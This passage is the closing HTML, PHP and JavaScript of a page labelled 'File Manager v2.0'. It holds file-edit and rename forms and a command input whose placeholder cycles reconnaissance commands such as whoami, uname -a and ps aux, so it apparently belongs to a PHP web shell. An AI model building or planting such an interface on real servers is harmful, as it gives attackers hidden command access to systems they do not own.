                            <i class="fas fa-save"></i> Save
                        </button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn" style="background: #666;">
                            <i class="fas fa-times"></i> Cancel
                        </a>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <!-- Rename Modal -->
        <?php if ($action === 'rename' && $file): ?>
            <div class="panel" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000;">
                <div class="panel-title">
                    <i class="fas fa-i-cursor"></i> RENAME: <?php echo htmlspecialchars($file); ?>
                </div>
                <form method="GET">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="file" value="<?php echo urlencode($file); ?>">
                    <input type="hidden" name="dir" value="<?php echo urlencode($current_dir); ?>">
                    <input type="text" name="newname" value="<?php echo htmlspecialchars($file); ?>" required
                           class="command-box" style="margin-bottom: 15px; font-size: 14px !important;">
                    <div style="display: flex; gap: 10px;">
                        <button type="submit" class="btn">
                            <i class="fas fa-check"></i> Rename
                        </button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn" style="background: #666;">
                            <i class="fas fa-times"></i> Cancel
                        </a>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <div class="panel" style="text-align: center; margin-top: 20px;">
            <p style="color: <?php echo $current_theme['secondary']; ?>; font-size: 0.8em;">
                <i class="fas fa-code"></i> File Manager v2.0 | 
                Compatible with PHP 5.x - 8.x | 
                <span class="glow-text">THEME: <?php echo strtoupper($current_theme['name']); ?></span> |
                <span class="glow-text">SECURE MODE: ACTIVE</span>
            </p>
        </div>
    </div>

    <script>
        // Toggle theme dropdown
        function toggleThemeDropdown() {
            const dropdown = document.getElementById('themeDropdown');
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        }
        
        // Change theme
        function changeTheme(themeName) {
            window.location.href = '?theme=' + themeName;
        }
        
        // Close dropdown when clicking outside
        document.addEventListener('click', function(event) {
            const dropdown = document.getElementById('themeDropdown');
            const themeBtn = document.querySelector('.theme-btn');
            
            if (!themeBtn.contains(event.target) && !dropdown.contains(event.target)) {
                dropdown.style.display = 'none';
            }
        });
        
        // Scroll to top function for mobile
        function scrollToTop() {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        }
        
        // Add some cyberpunk effects
        document.addEventListener('DOMContentLoaded', function() {
            // Add glitch effect to header
            const header = document.querySelector('.header h1');
            setInterval(() => {
                if (Math.random() > 0.9) {
                    header.style.textShadow = '0 0 15px <?php echo $current_theme['primary']; ?>, 0 0 30px <?php echo $current_theme['primary']; ?>';
                    setTimeout(() => {
                        header.style.textShadow = '0 0 8px <?php echo $current_theme['primary']; ?>, 0 0 15px <?php echo $current_theme['primary']; ?>';
                    }, 100);
                }
            }, 500);
            
            // Add terminal typing effect to command box
            const commandBox = document.querySelector('[name="command"]');
            if (commandBox && !commandBox.value) {
                const commands = [
                    'whoami',
                    'ls -la',
                    'pwd',
                    'uname -a',
                    'ps aux',
                    '<?php echo $current_theme['name']; ?> theme active'
                ];
                let cmdIndex = 0;
                let charIndex = 0;
                let isDeleting = false;
                
                function typeCommand() {
                    const currentCmd = commands[cmdIndex];
                    
                    if (!isDeleting) {
                        commandBox.placeholder = currentCmd.substring(0, charIndex + 1);
                        charIndex++;
                        
                        if (charIndex === currentCmd.length) {
                            isDeleting = true;
                            setTimeout(typeCommand, 2000);
                            return;
                        }
                    } else {
                        commandBox.placeholder = currentCmd.substring(0, charIndex - 1);
                        charIndex--;
                        
                        if (charIndex === 0) {
                            isDeleting = false;
                            cmdIndex = (cmdIndex + 1) % commands.length;
                        }
                    }
                    
                    setTimeout(typeCommand, isDeleting ? 50 : 100);
                }
                
                setTimeout(typeCommand, 1000);
            }
            
            // Add touch feedback for buttons
            const buttons = document.querySelectorAll('.btn, .action-btn, .theme-btn');
            buttons.forEach(button => {
                button.addEventListener('touchstart', function() {
                    this.style.transform = 'scale(0.95)';
                });
                
                button.addEventListener('touchend', function() {
                    this.style.transform = '';
                });
            });
            
            // Improve touch scrolling for tables
            const tables = document.querySelectorAll('.file-table');
            tables.forEach(table => {
                let startX;
                let scrollLeft;
                
                table.addEventListener('touchstart', function(e) {
                    startX = e.touches[0].pageX - this.offsetLeft;
                    scrollLeft = this.scrollLeft;
                });
                
                table.addEventListener('touchmove', function(e) {
                    if (!startX) return;
                    const x = e.touches[0].pageX - this.offsetLeft;
                    const walk = (x - startX) * 2;
                    this.scrollLeft = scrollLeft - walk;
                });
            });
            
            // Smooth theme transition
            document.body.style.opacity = 0;
            setTimeout(() => {
                document.body.style.transition = 'opacity 0.3s ease';
                document.body.style.opacity = 1;
            }, 100);
            
            // Show/hide mobile menu button based on scroll
            let lastScrollTop = 0;
            const mobileMenu = document.querySelector('.mobile-menu');
            
            window.addEventListener('scroll', function() {
                const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                
                if (scrollTop > 100) {
                    mobileMenu.style.display = 'block';
                } else {
                    mobileMenu.style.display = 'none';
                }
                
                lastScrollTop = scrollTop;
            });
        });
    </script>
</body>
</html>